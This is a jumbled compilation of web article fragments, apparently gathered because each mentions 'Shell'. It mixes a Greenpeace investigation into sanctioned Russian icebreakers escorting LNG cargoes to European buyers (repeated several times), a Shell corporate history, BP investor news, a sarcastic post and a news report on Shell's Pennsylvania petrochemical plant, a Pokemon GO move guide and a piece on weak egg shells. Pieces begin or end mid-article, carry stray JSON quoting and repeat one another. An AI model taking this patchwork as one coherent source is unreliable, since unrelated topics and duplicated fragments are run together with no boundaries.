            "content": "An investigation has revealed the critical role nuclear icebreakers play in enabling cargoes of liquified natural gas (LNG) from the Russian Arctic to reach Shell and other European companies. The icebreakers are operated by a Russian company called Atomflot that is subject to sanctions in the UK and EU following Russia\u2019s full-scale invasion of Ukraine.\n\nThe painstaking investigation by Unearthed, Greenpeace\u2019s journalism unit, and published in the i newspaper, involved tracking shipments of LNG from Sabetta on Russia\u2019s northern coast to ports all over Europe. Icebreakers can be clearly seen accompanying some of these tankers during the winter months when part of the route is obstructed by sea ice. There is no suggestion that Shell made direct payments to Atomflot, which would be a clear breach of sanctions.\n\nThe Yamal icebreaker, whose owner Atomflot, a state enterprise, is under international sanctions. Photo: Tuomas Romu CC BY-SA 3.0\n\nSupplies of piped Russian gas to Europe have dwindled since the full-scale invasion of Ukraine, but the trade in LNG has soared to record highs. Unearthed looked at deliveries from a major gas facility in Siberia owned by Yamal LNG. Yamal holds contracts to supply millions of tonnes of LNG to some of Europe\u2019s largest energy companies including Shell, TotalEnergies and Naturgy.\n\nOn five separate occasions, Unearthed was able to track shipments of 70,000 tonnes of gas that were escorted by Atomflot-linked icebreakers through the frozen Gulf of Ob, to the port of Montoir in France. From here, ship tracking data show that the tankers appear to offload their cargo of LNG to Shell tankers before being shipped on to customers in Asia and the Middle East.\n\nIn a further 23 cases, Atomflot\u2019s icebreakers escorted deliveries of LNG through the Gulf of Ob to ports across Europe, including Zeebrugge (Belgium), Dunkerque and Montoir (France), Huelva, Mugardos and Bilbao (Spain), and Rotterdam (the Netherlands). According to information held by the trade intelligence company Kpler these shipments were destined for a range of European customers, including the French oil giant TotalEnergies and Spanish gas company Naturgy, both of which hold contracts for millions of tonnes of gas a year from the Russian Arctic.\n\nAlthough the investigation did not suggest any direct payments between European energy companies and Atomflot, lawyers contacted by Unearthed suggested it is possible the arrangement breaches sanctions against Russia. In both UK and EU law, sanctions may be broken if a \u2018sanctioned entity\u2019 (Atomflot) receives funds indirectly and where the buyer \u2018know[s] or should reasonably suspect that there was a sanctioned entity involved\u2019.\n\nCommenting on the findings, Elena Polisano, head of Greenpeace\u2019s Stop Drilling Start Paying campaign, said: \u201cThe list of things oil giants like Shell won\u2019t do for a little boost to their bottom line is very short indeed. While many world leaders are putting pressure on Putin to end this horrific war, Shell seems to have no qualms about buying Russian gas shipped through the Arctic with the help of sanction-hit icebreakers.\n\n\u201cThey seem to care as little about indirectly helping Putin\u2019s war machine as they do about fuelling more hurricanes, floods and wildfires around the world. If there has been a breach of sanctions, our elected leaders must put their foot down and force oil giants to play by the rules.\u201d\n\nIn response to the findings, a spokesperson from Shell said: \u201cWe comply with all applicable sanctions and regulations.\u201d It did not respond directly to questions about whether the company was previously aware of the role of Atomflot-linked icebreakers, or whether this role is ongoing.\n\nThe Spanish energy giant Naturgy released a statement in response saying: \u201cNaturgy has no contractual relationship whatsoever with third parties that are subject to sanctions from the EU.\u201d\n\nTotalEnergies has not responded to a request for comment at the time of writing.\n\nFergus Randolph KC of Brick Court Chambers, a lawyer specialising in sanctions, thought that Shell could have breached the sanctions if the gas supplier \u201ccontracted with Atomflot to provide the icebreaking service as part of the contract of delivery\u201d. He continued: \u201cIf that was the contractual situation, then it could be argued that Shell knew, or had reason to believe that the icebreaking services were part of the overall charter package.\u201d\n\n\u201cNearly three years since Rosatoms attack on Chornobyl and its illegal occupation of the Zaporizhzhia nuclear plant it has almost completely avoided punishment through international sanctions. However its nuclear powered icebreakers operated by Atomflot are sanctioned by the EU, UK and the United Stares \u2013 their operations in the Arctic make possible massive LNG trade with Europe and the world. Those sanctions must be enforced \u2013 and Rosatom punished for its crimes. The financing of Russias war machine through fossil fuel exports needs to be cut off,\u201d said Shaun Burnie nuclear specialist at Greenpeace Ukraine.\n\nYamal LNG Plant in Sabetta, a joint venture between Russian natural gas company Novatek, TotalEnergies, and China\u2019s CNPC. Photo: Sefa Karacan/Anadolu Agency/Getty Image\n\nRead the full Unearthed investigation here\n\nRead today\u2019s report in the i newspaper here\n\nDownload a marine tracking video and image, taken from MarineTraffic, showing a shipment of liquified natural gas leaving Sabetta in Russia accompanied by the nuclear icebreaker 50 LET POBEDY here\n\nMethodology\n\nUnearthed used contract data from Bloomberg NEF to identify European companies that hold large contracts for supply from Yamal LNG. It then looked at data on shipments from Yamal LNG\u2019s port of Sabetta compiled by trade intelligence company Kpler to identify cargoes destined for Europe.\n\nUsing MarineTraffic, a database that tracks the movement of ships using AIS, Unearthed identified instances where LNG shipments destined for Europe were assisted by Atomflot-operated icebreakers between December 2023 and May 2024, the period in which the icebreakers were most active.\n\nIn the case of the cargoes that Kpler specified had been bought by Shell, Unearthed corroborated this by using MarineTraffic to monitor the cargoes being transshipped at Montoir, onto vessels that open-source reporting showed were contracted or owned by Shell. In a further case, Unearthed also found a bill of lading on export data platform Panjiva showing that Shell had bought the shipment.\n\nWhere there is no transshipment, it is harder to say conclusively who the end buyer was. Kpler attributes all cargoes to Spain as being bought by Naturgy; Unearthed has done the same. Naturgy were provided with a list of all shipments for Spain that Unearthed had monitored and identified as using Atomflot icebreakers. The company did not respond to this point.\n\nWhere shipments were to France, there were several possible buyers, including Shell. But given the scale of TotalEnergies\u2019 contract (5 million tonnes per year) and the frequency with which icebreakers were assisting shipments destined for Europe (77% of the shipments tracked), it is highly likely that some of these cargoes had been bought by TotalEnergies. The company has not responded at the time of writing.\n\nPhoto: the Yamal icebreaker, whose owner Atomflot, a state enterprise, is under international sanctions. Photo: Tuomas Romu, CC BY-SA 3.0",

It appears likely that any fees due to Atomflot will have been paid by Yamal LNG, which ships the cargoes to Europe.\n\nHowever, the investigation reveals the vital role Atomflot\u2019s fleet of nuclear-powered icebreakers has played in ensuring delivery of vast quantities of Russian LNG to western terminals.\n\nLawyers and campaigners said these indirect links to a sanctioned entity could create legal and ethical risks for Shell and other European companies.\n\nThe more [Putin] exports, the more Ukrainian soldiers and civilians die\n\n\u2013 Sir Bill Browder\n\n\u201cAny business arrangement that is contingent on the participation of a designated person is likely to be at very high risk of a breach of sanctions,\u201d said Peter Caldwell, a barrister with expertise in sanctions at Doughty Street chambers.\n\nA breach would only take place if the company knew or could reasonably suspect that Atomflot was to receive a \u201csignificant financial benefit\u201d from the use of the icebreakers.\n\nInformation as to what Atomflot charges for its icebreaking services is publicly available. The website of its parent company, Rosatom, has a fee calculator for the cost of icebreaker assistance, which suggests that it would charge around 40m rubles (\u00a3300,000) to accompany a shipment of the scale purchased by Shell.\n\nThe sanctions campaigner and financier Sir Bill Browder said: \u201cPutin\u2019s murderous war in Ukraine has been sustained primarily by revenues from oil and gas exports. The more he exports, the more Ukrainian soldiers and civilians die.\n\n\u201cIf companies are benefiting from the use of a sanctioned Russian icebreaker to move their LNG then as far as I\u2019m concerned that\u2019s a violation of the sanctions and should be punished.\u201d\n\nA spokesperson for Shell said: \u201cWe comply with all applicable sanctions and regulations.\u201d Unearthed understands that the company has reviewed the information gathered for this investigation and does not believe it has breached sanctions.\n\nA spokesperson for Naturgy said: \u201cNaturgy has no contractual relationship whatsoever with third parties that are subject to sanctions from the EU.\u201d\n\nTotalEnergies did not respond to requests for comment.\n\nShipping from the Arctic\n\nThe shipments received by Shell came from Yamal LNG, a Siberian facility majority-owned by Russian gas producer Novatek that can produce up to 16.5m tonnes of LNG each year for export to clients in Europe and Asia.\n\nIn the winter and spring, however, the waters surrounding Yamal LNG become thick with ice. Tankers carrying gas from Yamal\u2019s port, Sabetta, during the ice season often need help from Atomflot\u2019s nuclear icebreakers to make it through.",

It is a vertically integrated and diversified company operating in all aspects of the oil industry. It is counted among the \u201csuper-majors\u201d and one of the world\u2019s largest companies in terms of scope, revenue and earnings. It is listed on the London LSE, the Amsterdam Euronext and the New York Stock Exchange.\n\nRoyal Dutch Shell plc was founded in 1907 because of Standard Oil\u2019s growth and growing global dominance. It is a merger of the Royal Dutch Petroleum Company (founded in 1890) and The \u201cShell\u201d Transport Compay, founded in 1897. The Royal Dutch Petroleum Company was engaged in oil operations in southeast Asia while The \u201cShell\u201d Transport Company was a family-owned import business focused initially on seashells.\n\nThe two operating segments of Royal Dutch Shell were not legally unified as a business for several reasons but acted as one company in all operations. The Royal Dutch Petroleum end of operations was responsible for the exploration and production of oil liquids and gasses while The \u201cShell\u201d Transport Company was responsible for transport and storage.\n\nThe company purchased assets from the Rothschilds in 1912 boosted operations by more than double. This led to explosive growth but the WWI years were hard on the company. More than 15% of its global operations were destroyed and had to be rebuilt or replaced, an issue it will have to deal with more than once as it expands around the globe. By 1930, Royal Dutch Shell was the world's largest producer of petroleum products and chemicals, a standing it will maintain for many years.\n\nThe company was known as one of the 7 Sisters which dominated the oil market between 1940 to 1970 and in 1970 it helped to pioneer oceanic transport of liquified natural gas. It maintained its dual status with operations, headquarters and listing in both London and the Netherlands until 2005. In 2005 it unified and became a single entity with its headquarters in The Hague, the Netherlands. That status lasted until 2022 when it unified once again, this time its Class A and Class B shares, and moved its headquarters to London.\n\nToday Shell plc operates as a diversified energy company with global operations. It operates through 4 key segments that are Integrated Gas, Upstream, Oil Products and Chemicals. The Gas and Upstream segments explore for and extract petroleum products while the Oil Products and Chemicals segments refine, store, transport and markets feedstocks, fuel products and petrochemicals. At the end of 2021, the company had just over 9 billion in proven reserves, a figure that had been in decline for 6 years.",

            "content": "According to Bloomberg, Elliott Management, a well-known activist hedge fund, has acquired a stake in the struggling UK oil giant BP (BP).

Still, the hedge fund, which manages $70 billion in assets, has been known to increase the size of its investments while focusing on fewer companies. BP\u2019s shares have declined over 6% in the past year, while rival Shell\u2019s (SHEL) shares have risen by 7.63%. Investors have been vocal about BP\u2019s financial underperformance, high debt levels, and lack of clear strategy.\n\nElliott\u2019s Push for Strategic Overhaul\n\nElliott\u2019s involvement could push BP to refocus on its core oil and gas business and move away from its extensive green energy projects. One BP investor suggested that Elliott might call for a complete company break-up or a reduction from weaker businesses, possibly relisting in the U.S.\n\nOther activist funds have considered investing in BP, but its size has prevented them from following through. One U.S. activist described BP\u2019s board as \u201casleep at the wheel\u201d with a \u201cmuddled strategy,\u201d adding that \u201cBP\u2019s upstream business on its own justifies its entire market value.\u201d\n\nHowever, two senior investment bankers mentioned that Shell remains the most likely suitor for BP despite the challenges of such a large international deal. A merger between the two largest oil companies has been discussed for decades, but regulatory obstacles, such as competition concerns and potential job losses, were always in the way.\n\nShell Is not in Any Hurry\n\nShell\u2019s CEO, Wael Sawan, has stated that the company is focused on improving its performance and financial discipline rather than pursuing large mergers. The UK government\u2019s stance on clean energy and reluctance to issue new oil and gas drilling licenses in the North Sea could also impact any potential deal.\n\nBP will report its quarterly results on Tuesday and update investors on its medium-term strategy on February 26. The company has already announced cost-cutting measures, including a 5% reduction in its workforce and a $2 billion cut in annual costs. Since the company\u2019s recent trading update, analysts have lowered their earnings estimates for BP\u2019s fourth quarter by about 35%. Elliott\u2019s reputation as an imposing activist investor suggests that significant changes could be on the horizon for BP. With the hedge fund\u2019s stake now in play, the future of BP could see dramatic shifts, making it a compelling story for investors and industry watchers alike.",

            "content": "An investigation has revealed the critical role nuclear icebreakers play in enabling cargoes of liquified natural gas (LNG) from the Russian Arctic to reach Shell and other European companies. The icebreakers are operated by a Russian company called Atomflot that is subject to sanctions in the UK and EU following Russia\u2019s full-scale invasion of Ukraine.\n\nThe painstaking investigation by Unearthed, Greenpeace\u2019s journalism unit, and published in the i newspaper, involved tracking shipments of LNG from Sabetta on Russia\u2019s northern coast to ports all over Europe. Icebreakers can be clearly seen accompanying some of these tankers during the winter months when part of the route is obstructed by sea ice. There is no suggestion that Shell made direct payments to Atomflot, which would be a clear breach of sanctions.\n\nSupplies of piped Russian gas to Europe have dwindled since the full-scale invasion of Ukraine, but the trade in LNG has soared to record highs. Unearthed looked at deliveries from a major gas facility in Siberia owned by Yamal LNG. Yamal holds contracts to supply millions of tonnes of LNG to some of Europe\u2019s largest energy companies including Shell, TotalEnergies and Naturgy.\n\nOn five separate occasions, Unearthed was able to track shipments of 70,000 tonnes of gas that were escorted by Atomflot-linked icebreakers through the frozen Gulf of Ob, to the port of Montoir in France. From here, ship tracking data show that the tankers appear to offload their cargo of LNG to Shell tankers before being shipped on to customers in Asia and the Middle East.\n\nIn a further 23 cases, Atomflot\u2019s icebreakers escorted deliveries of LNG through the Gulf of Ob to ports across Europe, including Zeebrugge (Belgium), Dunkerque and Montoir (France), Huelva, Mugardos and Bilbao (Spain), and Rotterdam (the Netherlands). According to information held by the trade intelligence company Kpler these shipments were destined for a range of European customers, including the French oil giant TotalEnergies and Spanish gas company Naturgy, both of which hold contracts for millions of tonnes of gas a year from the Russian Arctic.\n\nAlthough the investigation did not suggest any direct payments between European energy companies and Atomflot, lawyers contacted by Unearthed suggested it is possible the arrangement breaches sanctions against Russia. In both UK and EU law, sanctions may be broken if a \u2018sanctioned entity\u2019 (Atomflot) receives funds indirectly and where the buyer \u2018know[s] or should reasonably suspect that there was a sanctioned entity involved\u2019.\n\nCommenting on the findings, Elena Polisano, head of Greenpeace\u2019s Stop Drilling Start Paying campaign, said:\n\n\u201cThe list of things oil giants like Shell won\u2019t do for a little boost to their bottom line is very short indeed. While many world leaders are putting pressure on Putin to end this horrific war, Shell seems to have no qualms about buying Russian gas shipped through the Arctic with the help of sanction-hit icebreakers.\n\n\u201cThey seem to care as little about indirectly helping Putin\u2019s war machine as they do about fuelling more hurricanes, floods and wildfires around the world. If there has been a breach of sanctions, our elected leaders must put their foot down and force oil giants to play by the rules.\u201d\n\nIn response to the findings, a spokesperson from Shell said: \u201cWe comply with all applicable sanctions and regulations.\u201d It did not respond directly to questions about whether the company was previously aware of the role of Atomflot-linked icebreakers, or whether this role is ongoing.\n\nThe Spanish energy giant Naturgy released a statement in response saying: \u201cNaturgy has no contractual relationship whatsoever with third parties that are subject to sanctions from the EU.\u201d\n\nTotalEnergies has not responded to a request for comment at the time of writing.\n\nFergus Randolph KC of Brick Court Chambers, a lawyer specialising in sanctions, thought that Shell could have breached the sanctions if the gas supplier \u201ccontracted with Atomflot to provide the icebreaking service as part of the contract of delivery\u201d. He continued: \u201cIf that was the contractual situation, then it could be argued that Shell knew, or had reason to believe that the icebreaking services were part of the overall charter package.\u201d\n\nEnds\n\nRead the full Unearthed investigation here\n\nRead today\u2019s report in the i newspaper here\n\nDownload a marine tracking video and image, taken from MarineTraffic, showing a shipment of liquified natural gas leaving Sabetta in Russia accompanied by the nuclear icebreaker 50 LET POBEDY here\n\nMethodology\n\nUnearthed used contract data from Bloomberg NEF to identify European companies that hold large contracts for supply from Yamal LNG. It then looked at data on shipments from Yamal LNG\u2019s port of Sabetta compiled by trade intelligence company Kpler to identify cargoes destined for Europe.\n\nUsing MarineTraffic, a database that tracks the movement of ships using AIS, Unearthed identified instances where LNG shipments destined for Europe were assisted by Atomflot-operated icebreakers between December 2023 and May 2024, the period in which the icebreakers were most active.\n\nIn the case of the cargoes that Kpler specified had been bought by Shell, Unearthed corroborated this by using MarineTraffic to monitor the cargoes being transshipped at Montoir, onto vessels that open-source reporting showed were contracted or owned by Shell. In a further case, Unearthed also found a bill of lading on export data platform Panjiva showing that Shell had bought the shipment.\n\nWhere there is no transshipment, it is harder to say conclusively who the end buyer was. Kpler attributes all cargoes to Spain as being bought by Naturgy; Unearthed has done the same. Naturgy were provided with a list of all shipments for Spain that Unearthed had monitored and identified as using Atomflot icebreakers. The company did not respond to this point.\n\nWhere shipments were to France, there were several possible buyers, including Shell. But given the scale of TotalEnergies\u2019 contract (5 million tonnes per year) and the frequency with which icebreakers were assisting shipments destined for Europe (77% of the shipments tracked), it is highly likely that some of these cargoes had been bought by TotalEnergies. The company has not responded at the time of writing.",

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against the other stocks.\n\nThe global economy seems to be at a point where fiscal ambition intersects with market skepticism, says Oakglen Wealth. Donald Trump\u2019s presidential election and the Republican takeover of the US Senate and retention of the House of Representatives resulted in a complicated mix of policy goals. Notably, the broader market\u2019s initial reaction hints at positivity given Trump\u2019s plans for growth, hinting at the continued outperformance of US assets in the year ahead.\n\nSectors To Focus on in 2025\n\nFidelity has an optimistic view of the financial sector, primarily because of steady economic growth for the broader US economy. Since the financial sector is cyclical, the sector\u2019s performance is mainly a function of the strength of the broader economy. The US economy has been showing momentum and a path towards the desired \u201csoft landing,\u201d says Fidelity. Therefore, worries about a mild recession (which could have impacted the financial stocks) are alleviated. One significant difference in market dynamics entering 2025, in comparison to recent years, is the outlook on interest rates.\n\nThe H2 2024 began a new rate cycle, with the US Fed cutting rates for the first time since the initial days of the pandemic. Banks might benefit from higher interest rates due to higher NIMs. On the other hand, lower rates can help boost confidence and decrease the pressure on economic growth, which is expected to be beneficial for virtually all industries in this sector, opines Fidelity. Within equities, Franklin Templeton has an optimistic outlook on IT, health care, energy, consumer staples, and industrial sectors.\n\nREAD ALSO: 7 Best Stocks to Buy For Long-Term and 8 Cheap Jim Cramer Stocks to Invest In.\n\nGrowth Drivers Amidst Policy Shifts\n\nAs per Russell Investments, the US economy is resilient as it enters 2025, but the road ahead is expected to be affected by shifting policy dynamics. On the positive side, tax cuts and deregulation can offer a meaningful growth boost, mainly to domestic and cyclical sectors. The investment firm believes that companies leveraging AI technologies to enhance productivity\u2014mainly in industrials and healthcare\u2014 are expected to see material improvements to operating fundamentals.\n\nEven though the mega-cap AI stocks have fueled the market returns over recent years, leadership has been shifting to companies leveraging AI to develop real-world efficiencies. Russell Investments believes that the Trump administration\u2019s policies offer a delicate balancing act. It assumes that the new administration will not aggressively pursue policies that can create inflation risk.",

What a bargain for Pennsylvania taxpayers, who handed over $1.65 billion to Shell in exchange. You don\u2019t need to be an economist to see that the math here is, shall we say, garbage.\n\nIn a shocking twist that absolutely no one could have predicted, throwing $1.65 billion in taxpayer-funded corporate welfare at an oil giant did not magically transform Beaver County into an economic utopia. Who knew? (Oh right, plenty of people warned about this, but let\u2019s not let common sense get in the way of a good old-fashioned cash grab.)\n\nAccording to a new report by the Ohio River Valley Institute, a clean energy think tank, Shell\u2019s shiny new petrochemical plant\u2014the recipient of the largest tax credit in Pennsylvania history\u2014has done virtually nothing to stop the region\u2019s long-term economic decline.\n\n\u201c[B]y nearly every measure of economic activity, today Beaver County is worse off than it was before the Shell plant was announced in 2012,\u201d the report grimly states. That\u2019s right\u2014despite all the grand promises, economic indicators like population, employment, and GDP have declined since the project was announced, while the rest of Pennsylvania and the U.S. have grown.\n\nPromises vs. Reality: The Art of Corporate Fairy Tales\n\nShell originally promised that the Beaver County ethane cracker\u2014built with the help of one of the most generous handouts ever from the state\u2014would be a \u201cwindfall\u201d for the local economy. And for a brief, fleeting moment, it almost looked like they might be right! During peak construction, more than 8,500 workers flooded the area, bringing a temporary boost. But now? Those jobs are long gone, and Beaver County\u2019s economic struggles are worse than ever.\n\n\u201cYou\u2019ve got a lot of workers coming into Beaver County to build that plant, and for a few years, that actually does provide a boost,\u201d admitted Eric de Place, a senior research fellow at ORVI. \u201cBut those employment and population numbers fell off after 2020, the year of COVID, and are now lower than they were in the 2010s.\u201d\n\nMeanwhile, Shell continues to pat itself on the back, with spokesperson Natalie Gunnell insisting, \u201cShell takes an active role in the communities where we work and live.\u201d Ah yes, so \u201cactive\u201d that Beaver County is now experiencing a decline while the rest of the country moves forward.\n\nBut Hey, At Least They Paid a Few Taxes, Right?\n\nShell, which has raked in obscene profits while contributing to environmental degradation on a global scale, proudly pointed out that they have paid $52 million in taxes, royalties, and fees over the last three years. What a bargain for Pennsylvania taxpayers, who handed over $1.65 billion to Shell in exchange. You don\u2019t need to be an economist to see that the math here is, shall we say, garbage.\n\nEven Beaver County Commissioner Jack Manning tried to defend the deal, dismissing comparisons to more prosperous parts of Pennsylvania as \u201cridiculous.\u201d Manning insists that Beaver County is doing well compared to other struggling counties in Western Pennsylvania. Because when your economy is floundering, the best defense is, \u201cWell, at least we\u2019re not failing as badly as some other places.\u201d\n\nThe Bottom Line: Shell Got Paid, Beaver County Got Played\n\nSo here we are, with a billion-dollar chemical plant, a bunch of unmet promises, and an economy still circling the drain. But don\u2019t worry\u2014Shell\u2019s investors, like BlackRock and Vanguard, are surely laughing all the way to the bank. After all, this is just another day in the world of fossil fuel profiteering: extract resources, exploit taxpayers, and leave communities behind.\n\nAnd the best part? Shell isn\u2019t even pretending anymore. As one economist put it, \u201cCertainly, the project has not turned around the economic trends in Beaver County yet.\u201d\n\nThe real question is: Will it ever? Or did Beaver County just become the latest cautionary tale in the long, grim history of corporate welfare gone wrong?\n\nSpoiler alert: We all know the answer.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

It fell from grace after the Counter nerfs of Season 20, and the addition of the Community Day move doesn't help its case.\n\nAd\n\nTrending\n\nRazor Shell is a 35-energy Water-type Charged Attack that deals 35 damage. It also has a 50% chance of lowering the target's defense, making it a low-rated move in general. Furthermore, being a frail attacker without a solid STAB Fast Attack option to farm things down prevents Escavalier from taking advantage of any of its potential upsides.\n\nAlso read: Pokemon GO Karrablast and Shelmet Community Day PvP and PvE analysis\n\nTo be fair, in 1-1 shield situations in the Great League, Escavalier is just as bad with Razor Shell as it is with non-legacy Drill Run. Although Razor Shell does help improve Escavalier's usability slightly in the Ultra League, it is not to the point where it becomes useful. However, the wins it gains \u2014 against Feraligatr, Golisopod, Greninja, Galarian Moltres, and Malamar \u2014 are all solid ones.\n\nAd\n\nIs Escavalier with Razor Shell good in Pokemon GO PvE?\n\nWith or without Razor Shell, Escavalier has little to no utility in the PvE arena. It is not strong enough to be used as a strong attacker for raids or Gyms. It is also vulnerable to Fire-type damage, and cannot be used as a Gym defender.\n\nHow to get Escavalier with Razor Shell in Pokemon GO\n\nEscavalier's evolution process (Image via TPC)\n\nTo get Escavalier with Razor Shell in Pokemon GO, you must evolve it between 2 pm local time on February 9 and 10 pm local time on February 16, 2025. This can be done either by trading a Karrablast or feeding the Pokemon 200 Candy. The only case where you should use the latter process is if you have top-notch PvP IVs on the thing.

            "content": "Shell plc, formerly known as Royal Dutch Shell plc, is a UK-based multinational oil and gas company. It is a vertically integrated and diversified company operating in all aspects of the oil industry. It is counted among the \u201csuper-majors\u201d and one of the world\u2019s largest companies in terms of scope, revenue and earnings. It is listed on the London LSE, the Amsterdam Euronext and the New York Stock Exchange.\n\nRoyal Dutch Shell plc was founded in 1907 because of Standard Oil\u2019s growth and growing global dominance. It is a merger of the Royal Dutch Petroleum Company (founded in 1890) and The \u201cShell\u201d Transport Compay, founded in 1897. The Royal Dutch Petroleum Company was engaged in oil operations in southeast Asia while The \u201cShell\u201d Transport Company was a family-owned import business focused initially on seashells.\n\nThe two operating segments of Royal Dutch Shell were not legally unified as a business for several reasons but acted as one company in all operations. The Royal Dutch Petroleum end of operations was responsible for the exploration and production of oil liquids and gasses while The \u201cShell\u201d Transport Company was responsible for transport and storage.\n\nThe company purchased assets from the Rothschilds in 1912 boosted operations by more than double. This led to explosive growth but the WWI years were hard on the company. More than 15% of its global operations were destroyed and had to be rebuilt or replaced, an issue it will have to deal with more than once as it expands around the globe. By 1930, Royal Dutch Shell was the world's largest producer of petroleum products and chemicals, a standing it will maintain for many years.\n\nThe company was known as one of the 7 Sisters which dominated the oil market between 1940 to 1970 and in 1970 it helped to pioneer oceanic transport of liquified natural gas. It maintained its dual status with operations, headquarters and listing in both London and the Netherlands until 2005. In 2005 it unified and became a single entity with its headquarters in The Hague, the Netherlands. That status lasted until 2022 when it unified once again, this time its Class A and Class B shares, and moved its headquarters to London.\n\nToday Shell plc operates as a diversified energy company with global operations. It operates through 4 key segments that are Integrated Gas, Upstream, Oil Products and Chemicals. The Gas and Upstream segments explore for and extract petroleum products while the Oil Products and Chemicals segments refine, store, transport and markets feedstocks, fuel products and petrochemicals. At the end of 2021, the company had just over 9 billion in proven reserves, a figure that had been in decline for 6 years.",

(I asked an eggspert: Probably never!)\n\nSorry to stress you out, but the egg situation is getting worse and worse.\n\nAccording to eggsperts \u2014 no, I will not apologize for that \u2014 not only are there super-high prices and empty shelves: But we're also looking at a return to eggs with weak and unusually chippy shells.\n\nYou already know egg prices went up. They're on everyone's mind \u2014 at least egg-eating minds. A dozen eggs cost an average of $4.15 in December, according to federal statistics \u2014 up from $2.51 the previous December.\n\nAnd in a true sign of the eggpocalypse: Waffle House is now adding a 50-cent surcharge for eggs \u2014 for each egg, that is!\n\nOn TikTok, Magda S. has been tracking egg prices in a spreadsheet that's online and open to the public. She didn't want to reveal her last name, but her full identity is known to BI.\n\nMagda has gone viral for the stunt and said she plans to continue to update her spreadsheet for the next four years \u2014 to mark whether egg prices decline during Donald Trump's presidency.\n\n\"Everyone wants to talk about eggs,\" she told me.\n\nIf you haven't been to a grocery store lately, you might not know another part of the egg emergency: Shelves have started to run bare.\n\nA worsening avian influenza outbreak has caused an egg shortage across the US. Viral videos of customers swarming the egg pallets at Costco are all over social media. Last weekend, thieves made off with 100,000 eggs from the Pete & Gerry's distribution center in Pennsylvania.\n\nMy local grocery store in Connecticut has put a limit on the number of cartons per customer (two). A friend who's a workout enthusiast who used to eat five protein-rich eggs every morning lamented to me that his \"macros\" were in disarray.\n\nEgg prices aren't the worst of it \u2014 the chips are back\n\nNow, things are probably going to get even worse. Because the eggs \u2014 if you can even find them, not to mention afford them \u2014 are going to start getting chippy again.\n\nMore than a year ago, I had noticed that it seemed like eggshells were chipping into the bowl or pan more often when I was cracking them. My cracking technique hadn't changed, but it seemed like I was suddenly having to fish out little bits of shell all the time \u2014 something that was previously a rare occurrence.\n\nIt turned out that I wasn't wrong \u2014 something about the quality of eggshells at the time had made them chippier than before.\n\nSo last March, I spoke to Sheila Purdum, professor of animal science at the University of Nebraska-Lincoln, who specializes in poultry. She explained that the 2022 bird flu outbreak had a lingering effect on egg production. Because so many hens had to be destroyed, the remaining healthy hens were kept laying eggs past the typical age of their, uh, \"retirement.\"\n\nHens are typically considered past their laying prime by age 2 or 3. By this age, hens can still lay eggs, but there are downsides: The eggs tend to have thinner shells, which are more prone to breaking in the container or chipping into the bowl when you crack them.\n\ni am a bodega psa now pic.twitter.com/PvFP5vH387 \u2014 Emily Stewart (@EmilyStewartM) February 1, 2025\n\nThankfully, over the past year, I've anecdotally noticed that eggs seemed back to normal, cracking like they used to. This made sense, as chicken flocks rebounded, even if prices were going up.\n\nRelated stories\n\nBut the current shortage of eggs and the avian influenza continuing have me worried. So I reached back out to Professor Purdum to see if we're in for another round of weak shells.\n\nUnfortunately, probably so. Purdum told me she predicts that 15% to 20% of the US flock will be made up of older hens to make up for lost younger ones that were culled because of the flu.\n\nStill, things aren't all doom and gloom.\n\n\"Scientists and nutritionists like myself are already conducting research about how to keep 'old' hens healthy and producing good eggshells!\" Purdum said. \"Work is being done. There is hope.\"\n\nIn the future, we might still be shelling out the big clucks for eggs, but we can hope that they at least won't be too chippy.",

All those numbers declined in Beaver County between 2012, when the project was announced, and 2023, while the overall numbers in Pennsylvania and the rest of the U.S. increased.\n\n\u201cWhat the data reveal is that Shell\u2019s claim that the plant would be a \u201cwindfall\u201d to the economy has utterly failed to materialize,\u201d the report said.\n\nShell\u2019s Beaver County ethane cracker began operations in 2022, with a $1.65 billion state tax credit. More than 8,500 people, many from out of state, crowded into the area to work on the plant at peak construction.\n\nThe report found that the construction period led to a rise in population and economic activity in the county.\n\n\u201cYou\u2019ve got a lot of workers coming into Beaver County to build that plant, and for a few years, that actually does provide a boost,\u201d said Eric de Place, a senior research fellow at ORVI and co-author on the study.\n\nBut those employment and population numbers fell off after 2020, the year of COVID, and are now lower than they were in the 2010s.\n\n\u201cPennsylvania and the United States have continued to see GDP rise pretty steadily over that time\u2026but Beaver County didn\u2019t,\u201d de Place said.\n\n\u201cThe backers of this project promised that what would happen is that working age people would move to Beaver County and they would bring their families with them,\u201d he said. \u201cThat\u2019s not what the population data appears to show.\u201d\n\nThe plant currently employs nearly 500 people, and has paid \u201c$52 million in taxes, royalties, and fees in Pennsylvania during the last three years,\u201d said Shell spokesperson Natalie Gunnell in a statement.\n\n\u201cShell takes an active role in the communities where we work and live,\u201d she said. \u201cOver the life of the project, and now the constructed facility, we have made it a priority to work closely with communities and municipalities to manage social impacts and enhance the benefits we bring.\u201d\n\nThe report was criticized by Jack Manning, a Beaver County commissioner. He said that it compares the county, which has suffered from the loss of steel jobs beginning in the 1970s, to more affluent parts of Pennsylvania, like Philadelphia\u2019s suburbs. When compared to other counties in western Pennsylvania, he says Beaver County is doing well.\n\n\u201cComparing southwest [Pennsylvania] to anything east of Harrisburg is ridiculous,\u201d Manning said in an email. \u201cShell put us on the map with the largest construction project to be built in Pennsylvania history since WWII.\u201d\n\n\u201cThey\u2019ve only been up and running at a steady state for a little over a year. This is a long-term process,\u201d he said. \u201c[W]e have seen more private, state and federal investments flow into Beaver County than we\u2019ve seen in decades.\u201d\n\nJeremy Weber, an economist at the University of Pittsburgh, said the report tries to do something that\u2019s very difficult: tease out what impact policies like a tax credit have on overall economic activity.\n\nBut he doubted whether Beaver County should be compared to the state on the whole. A better comparison would be other counties in similar economic and demographic conditions.\n\n\u201cIf you\u2019re comparing two places\u2026 you really need them to be similar,\u201d Webber said. \u201cIf you compare two places that are on different trajectories well before the plant, it\u2019s just very unclear what you\u2019re learning, other than, \u2018These places are different.\u2019 They were different before, and they remain different after.\u201d\n\nChris Briem, a regional economist at the University of Pittsburgh, said the report was largely correct that a boom in petrochemical manufacturing surrounding the plant has not, to date, materialized, as was promised in the buildup to the plant.\n\n\u201cCertainly, the project has not turned around the economic trends in Beaver County yet,\u201d Briem said. \u201cWould things have been worse without it? Possibly.\u201d\n\nBriem said it might be too early to say what the plant\u2019s long-term economic impact will be.\n\n\u201cBut certainly, anyone who expected that type of secondary impact [to the 